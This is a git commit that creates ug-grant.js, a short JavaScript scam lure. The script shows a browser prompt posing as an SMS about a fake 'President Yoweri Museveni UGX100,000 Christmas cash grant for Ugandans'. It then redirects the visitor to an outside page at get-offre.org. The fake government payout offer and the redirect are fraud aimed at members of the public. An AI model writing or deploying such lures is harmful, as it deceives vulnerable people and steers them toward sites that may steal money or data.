9a046f475948067c3675398a3bdbbe0e0ef66407
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-11-27 20:14:11 -0800

    Create ug-grant.js

---
+++ ug-grant.js
@@ -0,0 +1,6 @@
+
+var password = 'WITHDRAW UGX100,000'
+password=prompt('SMS: Congratulations You are qualify for President YOWERI MUSEVENI UGX100,000 CHRISTMAS CASH GRANT FOR UGANDANS, Kindly Press OK to Withdraw Cash Prize   ','WITHDRAW UGX100,000');
+if (password != 'WITHDRAW UGX100,000') {
+location.href='https://get-offre.org/uganda-exmas.html';
+}
